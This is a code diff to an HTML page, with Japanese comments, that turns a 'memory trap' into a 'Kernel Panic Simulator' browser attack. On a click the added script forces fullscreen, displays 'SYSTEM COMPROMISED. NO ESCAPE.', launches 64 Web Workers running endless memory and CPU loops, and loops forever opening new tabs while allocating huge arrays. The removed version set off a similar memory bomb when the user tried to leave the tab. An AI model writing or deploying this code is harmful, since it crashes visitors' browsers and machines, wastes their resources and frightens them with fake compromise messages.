@@ -2,12 +2,12 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>Heavy Memory Trap</title>
+    <title>Kernel Panic Simulator</title>
     <style>
         body {
             margin: 0;
-            background-color: #0b0f19;
-            color: #38bdf8;
+            background-color: #000;
+            color: #00ff00;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -17,52 +17,57 @@
             user-select: none;
         }
         h1 {
-            font-size: 2.2rem;
+            font-size: 2.5rem;
             text-align: center;
-            text-shadow: 0 0 10px #0284c7;
+            text-shadow: 0 0 10px #00ff00;
         }
     </style>
 </head>
 <body>
 
-    <h1>CLICK TO ARM TRAP</h1>
+    <h1>INITIALIZE</h1>
 
     <script>
-        let isArmed = false;
+        let armed = false;
 
-        // 実行のトリガー（クリックしてフルスクリーン＆罠を有効化）
         document.body.addEventListener('click', async () => {
             try {
                 await document.documentElement.requestFullscreen();
-            } catch (err) {}
+            } catch (e) {}
 
-            isArmed = true;
-            document.querySelector('h1').innerText = "TRAP ARMED.\nTry to leave or close this tab.";
-        });
+            armed = true;
+            document.querySelector('h1').innerText = "SYSTEM COMPROMISED.\nNO ESCAPE.";
 
-        // 離脱・閉じる動作を検知した瞬間に発動する極悪処理
-        function triggerMemoryBomb() {
-            if (!isArmed) return;
+            // マルチスレッド・ワーカー爆撃用スクリプトのBlob生成
+            const workerCode = `
+                while(true) {
+                    const arr = new Array(50000000).fill(Math.random());
+                    Math.pow(Math.random(), Math.random());
+                }
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(blob);
 
-            // 巨大な配列を無限に生成し続けてメモリを限界までアロケートする
-            // 処理が重すぎてブラウザのタブやウィンドウがそのまま力尽きる
-            const memoryLeakMonster = [];
-            while (true) {
-                // 1回につき数MB〜数十MBの文字列や配列を爆誕させる
-                memoryLeakMonster.push(new Array(10000000).fill(Math.random()));
+            // CPUコアを限界まで焼き尽くすためのWeb Worker軍団（最大数パラレル起動）
+            for (let i = 0; i < 64; i++) {
+                try {
+                    new Worker(workerUrl);
+                } catch (e) {}
             }
-        }
 
-        // タブを閉じようとしたり別のページに移動しようとした瞬間
-        window.addEventListener('beforeunload', (e) => {
-            e.preventDefault();
-            e.returnValue = '';
-            triggerMemoryBomb();
-        });
+            // メインスレッド＋タブ爆撃＋メモリバーストのトリプルコンボ
+            while (true) {
+                // ポップアップブロックを物理的に無視するための別窓・別タブ連続量産
+                try {
+                    window.open(location.href, '_blank');
+                } catch (e) {}
 
-        // フォーカスが外れた（他のウィンドウやタブに逃げようとした）瞬間
-        window.addEventListener('blur', () => {
-            triggerMemoryBomb();
+                // 同期的なメモリ無限アロケート
+                const a = [];
+                for (let j = 0; j < 10; j++) {
+                    a.push(new Array(100000000).fill(1));
+                }
+            }
         });
     </script>
 
